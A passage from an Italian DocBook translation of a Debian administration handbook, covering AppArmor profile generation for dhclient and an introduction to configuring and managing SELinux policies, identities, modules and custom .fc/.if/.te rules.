						Qui il programma cerca le autorizzazioni di lettura per <filename>/etc/nsswitch.conf</filename>. <command>aa-genprof</command> ha rilevato che questo permesso è stato concesso anche da "astrazioni" multiple e le offre come scelte alternative. Un'astrazione fornisce un insieme riutilizzabile di regole di accesso raggruppando più risorse che sono di solito utilizzate insieme. In questo caso specifico, il file è generalmente reso accessibile attraverso le funzioni NameService relative della libreria C e digitiamo "3" per selezionare prima la scelta “#include &lt;astrazioni/nomeservizio&gt;” e poi "A" per consentirla.
					</para>

				</callout>
				 <callout arearefs="aa-genprof-write">
					<para>
						Il programma cerca di creare il file <filename>/run/dhclient-eth0.pid</filename>. Se permettiamo la creazione di questo specifico file soltanto, il programma non funzionerà quando l'utente utilizzerà un'altra interfaccia di rete. Così selezioniamo "Nuovo" per sostituire il nome del file con il "/run/ddclient*.pid" più generico prima di registrare il dominio con "Consenti".
					</para>

				</callout>
				 <callout arearefs="aa-genprof-other-profile">
					<para>
						Si noti che la richiesta di accesso non è parte del profilo dhclient ma del nuovo profilo che abbiamo creato quando abbiamo permesso a <filename>/usr/lib/NetworkManager/nm-dhcp-helper</filename> di essere eseguito con il proprio profilo.
					</para>
					 <para>
						Dopo aver percorso tutti gli eventi registrati, il programma propone di salvare tutti i profili che sono stati creati durante l'esecuzione. In questo caso, abbiamo due profili che sono salvati in una volta con "Salva" (ma si possono salvare anche singolarmente) prima di lasciare il programma con "Fine".
					</para>

				</callout>

			</calloutlist>
			 <para>
				<command>aa-genprof</command> è in realtà solo un modulo intelligente intorno a <command>aa-logprof</command>: esso crea un profilo vuoto, lo carica in modalità compain ed esegue <command>aa-logprof</command> che è uno strumento per aggiornare il profilo in base alle violazioni del profilo che sono state registrate. Così in seguito si può eseguire nuovamente questo strumento per migliorare il profilo appena creato.
			</para>
			 <para>
				Se si desidera che il profilo generato sia completo, è necessario utilizzare il programma in tutti i modi legittimamente possibili. Nel caso di dhclient, significa eseguirlo tramite Network Manager, eseguirlo tramite ifupdown, eseguirlo manualmente, ecc Alla fine, si potrebbe ottenere un <filename>/etc/apparmor.d/sbin.dhclient</filename> simile a questo:
			</para>
			 
<programlisting>
# Last Modified: Tue Sep  8 21:40:02 2015
#include &lt;tunables/global&gt;

/sbin/dhclient {
  #include &lt;abstractions/base&gt;
  #include &lt;abstractions/nameservice&gt;

  capability net_bind_service,
  capability net_raw,

  /bin/dash r,
  /etc/dhcp/* r,
  /etc/dhcp/dhclient-enter-hooks.d/* r,
  /etc/dhcp/dhclient-exit-hooks.d/* r,
  /etc/resolv.conf.* w,
  /etc/samba/dhcp.conf.* w,
  /proc/*/net/dev r,
  /proc/filesystems r,
  /run/dhclient*.pid w,
  /sbin/dhclient mr,
  /sbin/dhclient-script rCx,
  /usr/lib/NetworkManager/nm-dhcp-helper Px,
  /var/lib/NetworkManager/* r,
  /var/lib/NetworkManager/*.lease rw,
  /var/lib/dhcp/*.leases rw,

  profile /sbin/dhclient-script flags=(complain) {
    #include &lt;abstractions/base&gt;
    #include &lt;abstractions/bash&gt;

    /bin/dash rix,
    /etc/dhcp/dhclient-enter-hooks.d/* r,
    /etc/dhcp/dhclient-exit-hooks.d/* r,
    /sbin/dhclient-script r,

  }
}
</programlisting>

		</section>

	</section>
	 <section id="sect.selinux">
		<title>Introduzione a SELinux</title>
		 <indexterm>
			<primary>SELinux</primary>
		</indexterm>
		 <section id="sect.selinux-principles">
			<title>Princìpi</title>
			 <para>
				SELinux (<emphasis>Security Enhanced Linux</emphasis>) è un sistema di <emphasis>controllo degli accessi obbligatorio</emphasis> costruito sull'interfaccia LSM (<emphasis>Linux Security Modules</emphasis>) di Linux. In pratica, il kernel interroga SELinux prima di ogni chiamata di sistema per sapere se il processo è autorizzato ad eseguire una data operazione.
			</para>
			 <para>
				SELinux sfrutta una serie di regole, note comunemente come <emphasis>politiche (policy)</emphasis>, per autorizzare o vietare operazioni. Queste regole sono difficili da creare. Fortunatamente vengono fornite due politiche standard (<emphasis>targeted</emphasis> e <emphasis>strict</emphasis>) per evitare il grosso del lavoro di configurazione.
			</para>
			 <para>
				Con SELinux, la gestione dei diritti è completamente diversa dai sistemi Unix tradizionali. I diritti di un processo dipendono dal proprio <emphasis>contesto di sicurezza</emphasis>. Il contesto è definito dall'<emphasis>identità</emphasis> dell'utente che ha avviato il processo, il <emphasis>ruolo</emphasis> e il <emphasis>dominio</emphasis> che l'utente presentava in quel momento. I diritti in realtà dipendono dal dominio, ma le transizioni attraverso i domini sono controllate dai ruoli. Infine, le possibili transizioni tra i ruoli dipendono dall'identità.
			</para>
			 <figure>
				<title>Contesti di sicurezza e utenti Unix</title>
				 <mediaobject>
					<imageobject>
						<imagedata fileref="images/selinux-context.png" format="PNG" scalefit="1" width="65%" />
					</imageobject>

				</mediaobject>

			</figure>
			 <para>
				In pratica, durante l'accesso, all'utente viene assegnato un contesto di sicurezza predefinito (a seconda dei ruoli che è abilitato ad assumere). Questo definisce il dominio corrente, e di conseguenza il dominio che tutti i suoi processi figli acquisiranno. Se si vuole variare il ruolo corrente e il dominio associato, si deve eseguire <command>newrole -r <replaceable>ruolo_r</replaceable> -t <replaceable>dominio_t</replaceable></command> (di solito esiste un solo dominio permesso per un dato ruolo, per cui il parametro <literal>-t</literal> si può tralasciare). Questo comando permette l'autenticazione su inserimento della propria password. Questa caratteristica impedisce ai programmi di muoversi automaticamente tra i ruoli. Tali cambiamenti possono avvenire solo se esplicitamente ammessi nella politica di SELinux.
			</para>
			 <para>
				Ovviamente i diritti non si applicano a tutti i <emphasis>soggetti</emphasis> (file, directory, socket, dispositivi, ecc.). Possono variare da oggetto a oggetto. Per applicare i diritti, ad ogni oggetto viene associato un <emphasis>tipo</emphasis> (questo processo è conosciuto come etichettatura). I diritti del dominio allora si esprimono come insiemi di operazioni permesse(vietate) su quei tipi (e, indirettamente, su tutti gli oggetti etichettati con quel tipo).
			</para>
			 <sidebar> <title><emphasis>EXTRA</emphasis> Domini e tipi sono equivalenti</title>
			 <para>
				Internamente, un dominio è proprio un tipo, ma un tipo applicabile solo ai processi. È per questo motivo che i domini hanno il suffisso <literal>_t</literal> proprio come i tipi degli oggetti.
			</para>
			 </sidebar> <para>
				Per impostazione predefinita, un programma eredita il relativo dominio dall'utente che lo ha eseguito, ma la politica standard di SELinux si aspetta che i programmi più importanti vengano eseguiti in domini dedicati. Per ottenere ciò, questi eseguibili sono etichettati con un tipo univoco (per esempio <command>ssh</command> è etichettato come <literal>ssh_exec_t</literal>, e quando il programma parte, automaticamente passa al dominio <literal>ssh_t</literal>). Questo meccanismo automatico di transizione di dominio permette di concedere esclusivamente i diritti richiesti da ciascun programma. Si tratta di un principio fondamentale di SELinux.
			</para>
			 <figure>
				<title>Transizioni automatiche attraverso domini</title>
				 <mediaobject>
					<imageobject>
						<imagedata fileref="images/selinux-transitions.png" format="PNG" scalefit="1" width="35%" />
					</imageobject>

				</mediaobject>

			</figure>
			 <sidebar> <title><emphasis>IN PRATICA</emphasis> Recuperare il contesto di sicurezza</title>
			 <indexterm>
				<primary>contesto di sicurezza</primary>
			</indexterm>
			 <indexterm>
				<primary>contesto, contesto di sicurezza</primary>
			</indexterm>
			 <indexterm>
				<primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary>
			</indexterm>
			 <para>
				Per recuperare il contesto di sicurezza di un dato processo, si usa l'opzione <literal>Z</literal> di <command>ps</command>.
			</para>
			 
<screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput></screen>
			 <para>
				Il primo campo riporta identità, ruolo, dominio e livello MCS, separati da due punti. Il livello MCS (<emphasis>Multi-Category Security</emphasis>) è un parametro che interviene nella configurazione della politica di protezione della riservatezza, che regola l'accesso ai file basato sulla relativa sensibilità. Questa caratteristica non verrà trattata in questo libro.
			</para>
			 <para>
				Per recuperare il contesto di sicurezza corrente in un terminale, eseguire <command>id -Z</command>.
			</para>
			 
<screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput></screen>
			 <para>
				Infine, per recuperare il tipo assegnato ad un file, usare <command>ls -Z</command>.
			</para>
			 
<screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
<computeroutput>unconfined_u:object_r:user_home_t:s0 test
     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput></screen>
			 <para>
				Vale la pena notare che identità e ruolo assegnati a un file non hanno alcuna particolare importanza (non vengono mai utilizzati), ma per ragioni di uniformità, ad ogni oggetto viene assegnato un contesto di sicurezza completo.
			</para>
			 </sidebar>
		</section>
		 <section id="sect.selinux-setup">
			<title>Impostare SELinux</title>
			 <para>
				Il supporto di SELinux è incluso nei kernel standard forniti da Debian. Gli strumenti di base in Unix supportano SELinux senza alcuna modifica. Abilitare SELinux quindi è relativamente semplice.
			</para>
			 <para>
				Il comando <command>apt install selinux-basics selinux-policy-default</command> installerà automaticamente i pacchetti richiesti per configurare un sistema SELinux.
			</para>
			 <sidebar> <title><emphasis>ATTENZIONE</emphasis> Policy di riferimento non in jessie</title>
			 <para>
				Purtoppo i manutentori del pacchetto sorgente <emphasis role="pkg">refpolicy</emphasis> non hanno gestito i bug critici del loro pacchetto ed il pacchetto è stato rimosso da jessie. Questo significa che i pacchetti <emphasis role="pkg">selinux-policy-*</emphasis> non sono attualmente installabili in jessie e hanno bisogno di essere recuperati da un'altro luogo. Speriamo che ritornino in qualche rilascio o nei backport di jessie. Nel frattempo, è possibile prenderli dalla unstable.
			</para>
			 <para>
				Questa triste situazione dimostra almeno che SELinux non è molto popolare tra gli utenti/sviluppatori che eseguono le versioni di sviluppo di Debian. Quindi, se si decide di usare SELinux, ci si dovrebbe aspettare che di default il sistema non funzioni perfettamente e si dovrà impiegare un pò di tempo per renderlo adatto alle esigenze specifiche.
			</para>
			 </sidebar> <para>
				Il pacchetto <emphasis role="pkg">selinux-policy-default</emphasis> fornisce un insieme di regole standard. Per impostazione predefinita, questa politica limita l'accesso ad alcuni servizi fortemente esposti. Le sessioni utente non sono limitate ed è perciò improbabile che SELinux possa bloccare operazioni utente legittime. Comunque, questo aumenta la sicurezza per i servizi in esecuzione sulla macchina. Per installare un insieme di politiche equivalenti alle vecchie regole "restrittive", basta disabilitare il modulo <literal>unconfined</literal> (la gestione dei moduli è descritta in dettaglio più avanti in questa sezione).
			</para>
			 <para>
				Una volta che la politica è stata installata, bisogna etichettare tutti i file presenti (il che significa assegnare loro un tipo). Questa operazione dev'essere intrapresa manualmente con <command>fixfiles relabel</command>.
			</para>
			 <para>
				Il sistema SELinux a questo punto è pronto. Per abilitarlo, bisogna aggiungere il parametro <literal>selinux=1 security=selinux</literal> al kernel Linux. Il parametro <literal>audit=1</literal> abilita la registrazione dei log di SELinux che memorizzano tutte le operazioni negate/non permesse. Da ultimo, il parametro <literal>enforcing=1</literal> mette le regole in applicazione: senza di esso SELinux lavora nella modalità predefinita <emphasis>permissiva</emphasis> dove le azioni bloccate vengono raccolte nei log ma comunque eseguite. Bisogna perciò modificare il file di configurazione del bootloader GRUB per aggiungere i parametri desiderati. Un modo semplice per farlo è quello di modificare la variabile <literal>GRUB_CMDLINE_LINUX</literal> in <filename>/etc/default/grub</filename> e di lanciare <command>update-grub</command>. SELinux verrà attivato al riavvio.
			</para>
			 <para>
				Vale la pena notare che lo script <command>selinux-activate</command> automatizza queste operazioni e forza l'etichettatura all'avvio successivo (che evita la creazione di nuovi file non etichettati mentre SELinux non è ancora attivo e mentre l'etichettatura è in corso).
			</para>

		</section>
		 <section id="sect.selinux-management">
			<title>Gestire un sistema SELinux</title>
			 <indexterm>
				<primary><command>semodule</command></primary>
			</indexterm>
			 <indexterm>
				<primary><command>semanage</command></primary>
			</indexterm>
			 <para>
				La politica di SELinux corrisponde ad un insieme modulare di regole, e la loro installazione rileva e abilita i moduli in base ai servizi già presenti. Il sistema è così immediatamente operativo. Comunque, quando un servizio viene installato dopo l'applicazione della politica di SELinux, deve essere possibile abilitare manualmente il modulo corrispondente. Questo è lo scopo del comando <command>semodule</command>. Inoltre, dev'essere possibile definire i ruoli che ogni utente può assumere, che può essere fatto con il comando <command>semanage</command>.
			</para>
			 <para>
				Questi due comandi quindi vengono usati per apportare modifiche all'attuale configurazione di SELinux, che è memorizzata in <filename>/etc/selinux/default/</filename>. Diversamente da altri file di configurazione che si trovano in <filename>/etc/</filename>, tutti questi file non devono essere modificati manualmente. Si devono utilizzare i programmi dedicati a questo scopo.
			</para>
			 <sidebar> <title><emphasis>APPROFONDIMENTI</emphasis> Documentazione ulteriore</title>
			 <para>
				Dal momento che NSA non fornisce alcuna documentazione ufficiale, la comunità per compensare ha istituito un wiki. Sono state raccolte un sacco di informazioni, ma bisogna fare attenzione che la maggior parte dei collaboratori sono utenti Fedora (dove SELinux è abilitato in modo predefinito). La documentazione pertanto tende ad essere specifica per questa distribuzione. <ulink type="block" url="http://www.selinuxproject.org" />
			</para>
			 <para>
				Bisogna dare anche uno sguardo alla pagina dedicata del wiki Debian e al blog di Russell Coker, che è uno dei più attivi sviluppatori Debian che si dedica al supporto SELinux. <ulink type="block" url="http://wiki.debian.org/SELinux" /> <ulink type="block" url="http://etbe.coker.com.au/tag/selinux/" />
			</para>
			 </sidebar> <section>
				<title>Gestione dei moduli SELinux</title>
				 <para>
					I moduli disponibili per SELinux sono situati nella directory <filename>/usr/share/selinux/default/</filename>. Per abilitare uno di questi nella configurazione corrente, si usa <command>semodule -i <replaceable>modulo.pp.bz2</replaceable></command>. L'estensione <emphasis>pp.bz2</emphasis> sta per <emphasis>policy package</emphasis>(compressa con bzip2).
				</para>
				 <para>
					Si può rimuovere un modulo dalla configurazione corrente con <command>semodule -r <replaceable>modulo</replaceable></command>. Infine, il comando <command>semodule -l</command> elenca i moduli che sono attualmente installati. Visualizza anche i loro numeri di versione. I moduli possono essere attivati selettivamente con <command>semodule -e</command> e disabilitai con <command>semodule -d</command>.
				</para>
				 
<screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0   Disabled
accountsd       1.1.0   
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0
accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput></screen>
				 <para>
					<command>semodule</command> carica immediatamente la nuova configurazione tranne nel caso si usi la sua opzione <literal>-n</literal>. Vale la pena notare che per impostazione predefinita il programma agisce sulla configurazione corrente (riportata nella variabile <literal>SELINUXTYPE</literal> in <filename>/etc/selinux/config</filename>), ma si può anche modificarne un'altra specificandola con l'opzione <literal>-s</literal>.
				</para>

			</section>
			 <section>
				<title>Gestione delle identità</title>
				 <para>
					Ogni volta che un utente effettua l'accesso, assume una determinata identità SELinux. Questa identità definisce i ruoli che egli può assumere. Queste due corrispondenze (utente-identità e identità-ruoli) sono configurabili con il comando <command>semanage</command>.
				</para>
				 <para>
					Bisogna assolutamente leggere la pagina di manuale <citerefentry><refentrytitle>semanage</refentrytitle>
					<manvolnum>8</manvolnum></citerefentry>, anche se la sintassi del comando sembra essere simile per tutti i concetti che vengono gestiti. Si troveranno opzioni comuni a tutti i sotto-comandi: <literal>-a</literal> per aggiungere, <literal>-d</literal> per eliminare, <literal>-m</literal> per modificare, <literal>-l</literal> per elencare, e <literal>-t</literal> per indicare un tipo (o un dominio).
				</para>
				 <para>
					<command>semanage login -l</command> elenca la corrispondenza in uso degli identificatori degli utenti con le identità SELinux. Gli utenti che non hanno un riferimento esplicito acquisiscono l'identità riportata nella voce <literal>__default__</literal>. Il comando <command>semanage login -a -s user_u <replaceable>utente</replaceable></command> associa l'identità <emphasis>user_u</emphasis> al dato utente. Infine, <command>semanage login -d <replaceable>utente</replaceable></command> rimuove la voce corrispondente assegnata all'utente.
				</para>
				 
<screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
<computeroutput>
Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         SystemLow-SystemHigh *
rhertzog             user_u               SystemLow            *
root                 unconfined_u         SystemLow-SystemHigh *
system_u             system_u             SystemLow-SystemHigh *
# </computeroutput><userinput>semanage login -d rhertzog</userinput></screen>
				 <para>
					<command>semanage user -l</command> elenca la corrispondenza delle identità degli utenti in SELinux con i ruoli assegnati. L'aggiunta di una nuova identità richiede la definizione sia dei ruoli corrispondenti sia di un prefisso di etichetta utilizzato per assegnare un tipo ai file personali (<filename>/home/<replaceable>utente</replaceable>/*</filename>). Il prefisso deve essere preso da <literal>user</literal>, <literal>staff</literal>, e <literal>sysadm</literal>. Il prefisso «<literal>staff</literal>» ha come risultato file di tipo «<literal>staff_home_dir_t</literal>». Per creare una nuova identità per l'utente in SELinux basta lanciare <command>semanage user -a -R <replaceable>ruoli</replaceable> -P <replaceable>prefisso</replaceable> <replaceable>identità</replaceable></command>. Infine, è possibile rimuovere un'identità di SELinux con <command>semanage user -d <replaceable>identity</replaceable></command>.
				</para>
				 
<screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
<computeroutput>
                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range             SELinux Roles

root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
system_u        user       SystemLow  SystemLow-SystemHigh  system_r
test_u          staff      SystemLow  SystemLow             staff_r user_r
unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
user_u          user       SystemLow  SystemLow             user_r
# </computeroutput><userinput>semanage user -d test_u</userinput></screen>

			</section>
			 <section>
				<title>Gestire i contesti dei file, le porte e i booleani</title>
				 <para>
					Ogni modulo SELinux fornisce un insieme di regole per l'etichettatura dei file, ma è anche possibile aggiungerne di personalizzate per far fronte a casi specifici. Per esempio, se si vuole che il server web possa leggere i file dentro la gerarchia <filename>/srv/www/</filename>, si deve lanciare <command>semanage fcontext -a -t httpd_sys_content_t "/srv/www(/.*)?"</command> seguito da <command>restorecon -R /srv/www/</command>. Il primo comando registra le nuove regole sull'etichettatura e il secondo reimposta i tipi di file in base alle regole di etichettatura correnti.
				</para>
				 <para>
					In modo del tutto simile, le porte TCP/UDP sono etichettate in modo da assicurare che solo il rispettivo demone possa rimanere in ascolto su di esse. Per esempio, se si vuole che il server web rimanga in ascolto su porta 8080, è consigliabile seguire <command>semanage port -m -t http_port_t -p tcp 8080</command>.
				</para>
				 <para>
					Alcuni moduli SELinux esportano opzioni booleane che si possono personalizzare per variare il comportamento delle regole predefinite. L'utilità <command>getsebool</command> viene usata per ispezionare tali opzioni (<command>getsebool <replaceable>booleano</replaceable></command> mostra un'opzione, e <command>getsebool -a</command> le mostra tutte). Il comando <command>setsebool <replaceable>booleano</replaceable> <replaceable>valore</replaceable></command> modifica il valore corrente di un'opzione booleana. L'opzione <literal>-P</literal> rende permanente la modifica, cioè il nuovo valore diventa il predefinito e questo rimarrà tale nei successivi riavvii. L'esempio sotto concede ai web server l'accesso alle directory home (utile quando gli utenti hanno siti web personali in <filename>~/public_html/</filename>).
				</para>
				 
<screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
<computeroutput>httpd_enable_homedirs --&gt; off
# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> 
<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput></screen>

			</section>

		</section>
		 <section id="sect.selinux-custom-rules">
			<title>Adattare le regole</title>
			 <para>
				Dato che la politica di SELinux è modulare, potrebbe essere interessante sviluppare nuovi moduli per le applicazioni (eventualmente personalizzate) che ne sono prive. Questi nuovi moduli quindi completerebbero la <emphasis>politica di riferimento</emphasis>.
			</para>
			 <para>
				Per creare nuovi moduli, è richiesto il pacchetto <emphasis role="pkg">selinux-policy-dev</emphasis> oltre a <emphasis role="pkg">selinux-policy-doc</emphasis>. Quest'ultimo contiene la documentazione delle regole standard (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) e file di esempio che possono essere usati come modelli per creare nuovi moduli. Installiamo questi file ed esaminiamoli più da vicino:
			</para>
			 
<screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput></screen>
			 <para>
				Il file <filename>.te</filename> è il più importante. Definisce le regole. Il file <filename>.fc</filename> definisce i "contesti dei file", che sono i tipi assegnati ai file relativi a questo modulo. I dati all'interno del file <filename>.fc</filename> sono usati durante la fase di etichettatura dei file. Infine, il file <filename>.if</filename> definisce l'interfaccia del modulo: si tratta di una serie di "funzioni pubbliche", che altri moduli possono utilizzare per interagire correttamente con il modulo che si sta creando.
			</para>
			 <section>
				<title>Scrivere un file <filename>.fc</filename></title>
				 <para>
					Analizzare l'esempio sotto dovrebbe essere sufficiente per capire la struttura di un file di questo tipo. Si possono usare espressioni regolari per assegnare lo stesso contesto di sicurezza a file multipli, oppure anche a un intero albero di directory.
				</para>
				 <example>
					<title>File <filename>example.fc</filename></title>
					 
<programlisting role="scale"># l'eseguibile miaapp avrà:
# label: system_u:object_r:miaapp_exec_t
# sensibilità MLS: s0
# categorie MCS : &lt;nessuna&gt;

/usr/sbin/miaapp         --      gen_context(system_u:object_r:miaapp_exec_t,s0)</programlisting>

				</example>

			</section>
			 <section>
				<title>Scrivere un file <filename>.if</filename> benutze</title>
				 <para>
					Nell'esempio sotto, la prima interfaccia («<literal>miaapp_domtrans</literal>») controlla chi può eseguire l'applicazione. La seconda («<literal>miaapp_lettura_log</literal>») concede i diritti di lettura sui file di log dell'applicazione.
				</para>
				 <para>
					Ogni interfaccia deve generare un insieme valido di regole che può essere incluso in un file <filename>.te</filename>. Si deve perciò dichiarare tutti i tipi che si usano (con la macro <literal>gen_require</literal>), e usare direttive standard per concedere i diritti. Da notare, comunque, che si possono utilizzare le interfacce fornite dagli altri moduli. Nella prossima sezione si approfondirà maggiormente come esprimere questi diritti.
				</para>
				 <example>
					<title>File <filename>example.if</filename></title>
					 
<programlisting>## &lt;summary&gt;Myapp example policy&lt;/summary&gt;
## &lt;desc&gt;
##      &lt;p&gt;
##              More descriptive text about myapp.  The &lt;desc&gt;
##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;
##              html tags for formatting.
##      &lt;/p&gt;
##      &lt;p&gt;
##              This policy supports the following myapp features:
##              &lt;ul&gt;
##              &lt;li&gt;Feature A&lt;/li&gt;
##              &lt;li&gt;Feature B&lt;/li&gt;
##              &lt;li&gt;Feature C&lt;/li&gt;
##              &lt;/ul&gt;
##      &lt;/p&gt;
## &lt;/desc&gt;
#

########################################
## &lt;summary&gt;
##      Execute a domain transition to run myapp.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to transition.
## &lt;/param&gt;
#
interface(`myapp_domtrans',`
        gen_require(`
                type myapp_t, myapp_exec_t;
        ')

        domtrans_pattern($1,myapp_exec_t,myapp_t)
')

########################################
## &lt;summary&gt;
##      Read myapp log files.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to read the log files.
## &lt;/param&gt;
#
interface(`myapp_read_log',`
        gen_require(`
                type myapp_log_t;
        ')

        logging_search_logs($1)
        allow $1 myapp_log_t:file r_file_perms;
')</programlisting>

				</example>
				 <sidebar> <title><emphasis>DOCUMENTAZIONE</emphasis> Spiegazioni in merito alla <emphasis>politica di riferimento</emphasis></title>
				 <para>
					La <emphasis>politica di riferimento</emphasis> è in evoluzione come ogni altro progetto di software libero: in base ai contributi volontari. Il progetto è ospitato presso Tresys, una delle aziende più attive nel campo di SELinux. Il suo wiki contiene spiegazioni sulla struttura delle regole e sulla loro creazione. <ulink type="block" url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted" />
				</para>
				 </sidebar>
			</section>
			 <section id="sect.writing-a-te-file">
				<title>Scrivere un file <filename>.te</filename></title>
				 <para>
					Osservare il file <filename>example.te</filename>:
				</para>
				 <sidebar> <title><emphasis>APPROFONDIMENTI</emphasis> Il linguaggio macro <command>m4</command></title>
				 <para>
					Per strutturare in modo appropriato la politica, gli sviluppatori di SELinux utilizzano un processore di comandi macro. Invece di duplicare molte direttive <emphasis>allow</emphasis> simili, creano «funzioni macro» per sfruttare una logica a più alto livello, che si traduce anche in una politica maggiormente comprensibile.
				</para>
				 <para>
					In pratica, per compilare queste regole viene usato <command>m4</command>. Con esso si esegue l'operazione opposta: si espandono tutte le direttive ad alto livello in un enorme database di direttive <emphasis>allow</emphasis>.
				</para>
				 <para>
					Le «interfacce» di SELinux sono semplicemente funzioni macro che vengono sostituite da un insieme di regole al momento della loro compilazione. Allo stesso modo, alcuni diritti sono in realtà gruppi di diritti che vengono sostituiti dai loro valori in fase di compilazione.
				</para>
				 </sidebar> 
<programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"></co>

########################################
#
# Declarations
#

type myapp_t; <co id="example.te.type"></co>
type myapp_exec_t;
domain_type(myapp_t)
domain_entry_file(myapp_t, myapp_exec_t) <co id="example.te.domain"></co>

type myapp_log_t;
logging_log_file(myapp_log_t) <co id="example.te.interface"></co>

type myapp_tmp_t;
files_tmp_file(myapp_tmp_t)

########################################
#
# Myapp local policy
#

allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"></co>

allow myapp_t myapp_tmp_t:file manage_file_perms;
files_tmp_filetrans(myapp_t,myapp_tmp_t,file)</programlisting>
				 <calloutlist>
					<callout arearefs="example.te.module">
						<para>
							Il modulo dev'essere identificato da nome e numero di versione. Questa direttiva è obbligatoria.
						</para>

					</callout>
					 <callout arearefs="example.te.type">
						<para>
							Se il modulo introduce nuovi tipi, deve dichiararli con direttive come questa. Non bisogna esitare a creare tanti tipi quanti necessari piuttosto che concedere troppi inutili diritti.
						</para>

					</callout>
					 <callout arearefs="example.te.domain">
						<para>
							Queste interfacce definiscono il tipo <literal>miaapp_t</literal> come un dominio di processo che deve essere usato da ogni eseguibile etichettato con <literal>miaapp_exec_t</literal>. Implicitamente, ciò aggiunge l'attributo <literal>exec_type</literal> a tutti questi soggetti, che a loro volta permettono ad altri moduli di concedere i diritti di esecuzione su questi programmi: per esempio, il modulo <literal>userdomain</literal> concede ai processi con dominio <literal>user_t</literal>, <literal>staff_t</literal> e <literal>sysadm_t</literal> di eseguirli. I domini di altre applicazioni circoscritte non avranno i diritti di eseguirli, finché le regole non concedono loro diritti simili (è questo il caso, per esempio, di <command>dpkg</command> con il relativo dominio <literal>dpkg_t</literal>).
						</para>

					</callout>
					 <callout arearefs="example.te.interface">
						<para>
							<literal>logging_log_file</literal> è un'interfaccia fornita dalla politica di riferimento. Essa indica che i file etichettati con quel dato tipo sono file di log che possono beneficiare delle regole associate (per esempio concedendo i diritti a <command>logrotate</command> in modo che possa manipolarli).
						</para>

					</callout>
					 <callout arearefs="example.te.allow">
						<para>
							La direttiva <literal>allow</literal> è la direttiva base per autorizzare un'operazione. Il primo parametro è il dominio del processo a cui è concessa l'esecuzione dell'operazione. Il secondo definisce l'oggetto che un processo del primo dominio può manipolare. Questo parametro si definisce come «<replaceable>tipo</replaceable>:<replaceable>classe</replaceable>» dove <replaceable>tipo</replaceable> è il proprio tipo SELinux e <replaceable>classe</replaceable> descrive la natura dell'oggetto (file, directory, socket, fifo, ecc.). Infine, l'ultimo parametro descrive i permessi (le operazioni consentite).
						</para>
						 <para>
							I permessi sono definiti come un insieme di operazioni consentite e seguono questo modello: <literal>{ <replaceable>operazione1</replaceable> <replaceable>operazione2</replaceable> }</literal>. Si possono usare comunque anche macro che rappresentano i permessi più comuni. L'elenco si trova in <filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename>.
						</para>
						 <para>
							La seguente pagina web fornisce una lista relativamente esaustiva delle classi di soggetti, e i permessi che possono essere consentiti. <ulink type="block" url="http://www.selinuxproject.org/page/ObjectClassesPerms" />
						</para>

					</callout>

				</calloutlist>
				 <para>
					Ora si deve trovare l'insieme minimo di regole necessarie per assicurare che l'applicazione o il servizio in questione funzioni correttamente. Per ottenere ciò, bisogna avere una buona conoscenza di come funziona l'applicazione e di che genere di dati vengono gestiti e/o prodotti.
				</para>
				 <para>
					È comunque possibile un approccio empirico. Una volta che i soggetti rilevanti sono stati correttamente etichettati, si può usare l'applicazione in modalità permissiva: che verrebbero bloccate vengono registrate ma vengono comunque eseguite. Analizzando i log, si possono identificare le operazioni da consentire. Questo è un esempio di una di queste voci di log:
				</para>
				 
